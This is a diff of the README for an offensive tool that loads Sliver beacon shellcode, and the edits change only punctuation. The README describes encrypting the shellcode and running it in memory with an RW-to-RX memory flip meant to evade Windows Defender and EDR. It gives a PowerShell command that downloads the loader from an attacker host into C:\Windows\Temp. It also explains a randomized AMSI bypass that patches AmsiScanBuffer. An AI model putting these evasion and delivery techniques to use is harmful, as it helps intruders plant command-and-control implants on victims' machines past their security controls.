@@ -1,6 +1,6 @@
 # nimcrypt
 
-A Sliver shellcode loader written in Nim. Encrypts your Sliver beacon shellcode with AES-256-CBC before dropping it on disk, then decrypts and executes it in memory on the target — keeping the raw shellcode off disk and out of static analysis reach.
+A Sliver shellcode loader written in Nim. Encrypts your Sliver beacon shellcode with AES-256-CBC before dropping it on disk, then decrypts and executes it in memory on the target, keeping the raw shellcode off disk and out of static analysis reach.
 
 Tested against Windows Defender with real-time monitoring enabled.
 
@@ -8,22 +8,22 @@ Tested against Windows Defender with real-time monitoring enabled.
 
 ### Encryption (your machine)
 
-`encrypt.py` reads the raw shellcode and encrypts it with AES-256-CBC using a randomly generated 32-byte key and 16-byte IV. The encrypted blob is what gets transferred to the target — the shellcode never touches the target's disk in plaintext, so static analysis and on-write Defender scans see only ciphertext.
+`encrypt.py` reads the raw shellcode and encrypts it with AES-256-CBC using a randomly generated 32-byte key and 16-byte IV. The encrypted blob is what gets transferred to the target. The shellcode never touches the target's disk in plaintext, so static analysis and on-write Defender scans see only ciphertext.
 
 ### Loader execution (target machine)
 
 The loader does the following at runtime:
 
 1. **Reads** the encrypted shellcode file from disk
-2. **Decrypts** it in memory using the Windows BCrypt API (AES-256-CBC). The key and IV are passed as arguments at runtime — they never exist in the binary itself
+2. **Decrypts** it in memory using the Windows BCrypt API (AES-256-CBC). The key and IV are passed as arguments at runtime. They never exist in the binary itself
 3. **Allocates** a memory region with `VirtualAlloc` using `PAGE_READWRITE` permissions
 4. **Copies** the decrypted shellcode into that region
 5. **Changes** the memory permissions to `PAGE_EXECUTE_READ` via `VirtualProtect` — the region is now executable but no longer writable (RW → RX)
 6. **Executes** the shellcode by casting the memory address to a function pointer and calling it
 
-The RW → RX transition is intentional — `PAGE_EXECUTE_READWRITE` (RWX) is a well-known red flag that Defender and EDRs specifically watch for. Allocating as RW first, writing the shellcode, then flipping to RX is the standard approach to avoid that signature.
+The RW → RX transition is intentional. `PAGE_EXECUTE_READWRITE` (RWX) is a well-known red flag that Defender and EDRs specifically watch for. Allocating as RW first, writing the shellcode, then flipping to RX is the standard approach to avoid that signature.
 
-The decrypted shellcode only exists in memory for the duration of execution — it is never written back to disk.
+The decrypted shellcode only exists in memory for the duration of execution. It is never written back to disk.
 
 ## Requirements
 
@@ -54,7 +54,7 @@ The decrypted shellcode only exists in memory for the duration of execution — 
 [*] Implant saved to /path/to/WICKED_SLIDER.bin
 ```
 
-> `--skip-symbols` speeds up build time. `--format shellcode` is required — do not use `--format exe`.
+> `--skip-symbols` speeds up build time. `--format shellcode` is required. Do not use `--format exe`.
 
 ### 3. Encrypt the shellcode
 
@@ -65,7 +65,7 @@ python3 encrypt.py WICKED_SLIDER.bin
 # [+] iv:  83b82994e8c512d536f7d42e89d6e761
 ```
 
-Save the key and IV — you need them at runtime.
+Save the key and IV, you need them at runtime.
 
 ### 4. Compile the loader
 
@@ -77,7 +77,7 @@ The `nim.cfg` handles all cross-compilation flags automatically. The output is a
 
 ### 5. Transfer to target
 
-Transfer `loader.exe` and `WICKED_SLIDER_enc.bin` to the target however you have access — certutil, PowerShell WebClient, SMB, etc.
+Transfer `loader.exe` and `WICKED_SLIDER_enc.bin` to the target however you have access, certutil, PowerShell WebClient, SMB, etc.
 
 ```powershell
 (New-Object Net.WebClient).DownloadFile("http://10.10.14.42/loader.exe", "C:\Windows\Temp\loader.exe")
@@ -110,20 +110,20 @@ If you are delivering via PowerShell rather than cmd, AMSI will scan your downlo
 python3 gen_amsi.py
 ```
 
-Paste the output into your PowerShell session before downloading or executing anything. A fresh randomized patch is generated on every run — different XOR key and byte arrays each time, so no two generated scripts share the same pattern.
+Paste the output into your PowerShell session before downloading or executing anything. A fresh randomized patch is generated on every run, with a different XOR key and byte arrays each time, so no two generated scripts share the same pattern.
 
 The patch works by:
-- Resolving `AmsiScanBuffer` via export table hash matching (FNV-1a, computed at compile time) — the string never appears in the script
-- Patching via `WriteProcessMemory` on the current process — no `VirtualProtect` call needed
+- Resolving `AmsiScanBuffer` via export table hash matching (FNV-1a, computed at compile time), the string never appears in the script
+- Patching via `WriteProcessMemory` on the current process, no `VirtualProtect` call needed
 - All strings (`amsi.dll`, `AmsiScanBuffer`, the C# P/Invoke definition) are XOR-encoded with the per-run random key
 
-> AMSI is irrelevant if you are executing `loader.exe` directly from cmd or xp_cmdshell — it only hooks script engines (PowerShell, JScript, .NET). Skip the patch in those cases.
+> AMSI is irrelevant if you are executing `loader.exe` directly from cmd or xp_cmdshell. It only hooks script engines (PowerShell, JScript, .NET). Skip the patch in those cases.
 
 ## Notes
 
-- The loader is statically linked against the mingw pthread runtime — no `libwinpthread-1.dll` required on the target
+- The loader is statically linked against the mingw pthread runtime, no `libwinpthread-1.dll` required on the target
 - Requires Windows 10 / Server 2016+ (Universal CRT). Server 2012 R2 works with KB3118401 installed
-- `BCryptSetProperty` for chaining mode returns `STATUS_INVALID_PARAMETER` but BCrypt defaults to CBC anyway — decryption works correctly
+- `BCryptSetProperty` for chaining mode returns `STATUS_INVALID_PARAMETER` but BCrypt defaults to CBC anyway, decryption works correctly
 
 ## References
 
